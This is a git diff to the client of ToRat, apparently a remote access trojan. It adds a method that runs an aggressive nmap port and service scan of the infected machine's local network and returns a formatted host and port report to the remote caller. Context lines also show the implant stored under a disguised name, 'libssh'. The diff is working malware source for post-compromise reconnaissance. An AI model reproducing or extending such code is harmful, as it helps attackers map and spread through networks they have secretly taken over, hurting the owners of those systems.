@@ -1,11 +1,16 @@
 package client
 
 import (
+	"bytes"
+	"context"
+	"fmt"
 	"io/ioutil"
 	"log"
 	"os"
 	"path/filepath"
+	"time"
 
+	"github.com/Ullaakut/nmap/v2"
 	"github.com/lu4p/ToRat/shared"
 	"github.com/lu4p/ToRat/torat_client/crypto"
 	"github.com/lu4p/shred"
@@ -20,6 +25,56 @@ var (
 	PathExe      = filepath.Join(Path, "libssh")
 	HostnamePath = filepath.Join(Path, "token")
 )
+
+func (a *API) NmapLocal(v shared.Void, r *shared.NmapLocal) error {
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
+	defer cancel()
+
+	fmt.Print("\nStarting Nmap New Scanner")
+	scanner, err := nmap.NewScanner(
+		nmap.WithTargets(GetLocalRange()),
+		nmap.WithMostCommonPorts(1000),
+		nmap.WithAggressiveScan(),
+		nmap.WithContext(ctx),
+	)
+
+	if err != nil {
+		fmt.Print(err)
+		return err
+	}
+
+	fmt.Print("\nStarting Nmap Scan")
+	result, warn, err := scanner.Run()
+	if err != nil {
+		fmt.Print(err)
+		fmt.Print(warn)
+		return err
+	}
+
+	fmt.Print("\nFinished Nmap Scan")
+	r.Range = GetLocalRange()
+	r.TimeElapsed = result.Stats.Finished.Elapsed
+	r.Hosts = len(result.Hosts)
+	var buff bytes.Buffer
+	fmt.Print("\nStarting Processing")
+
+	for _, host := range result.Hosts {
+		if len(host.Ports) == 0 || len(host.Addresses) == 0 {
+			continue
+		}
+		buff.WriteString(fmt.Sprintf("----Host %q:\n", host.Addresses[0]))
+
+		for _, port := range host.Ports {
+			buff.WriteString(fmt.Sprintf("|    |-Port %d/%s %s %s %s %s\n", port.ID, port.Protocol, port.State, port.Service.Name, port.Service.DeviceType, port.Service.ExtraInfo))
+		}
+		buff.WriteString("|")
+	}
+	fmt.Print("\nFinished Processing")
+
+	r.Scan = buff.String()
+	return nil
+
+}
 
 // CheckElevate checks whether the current process has administrator
 // privileges
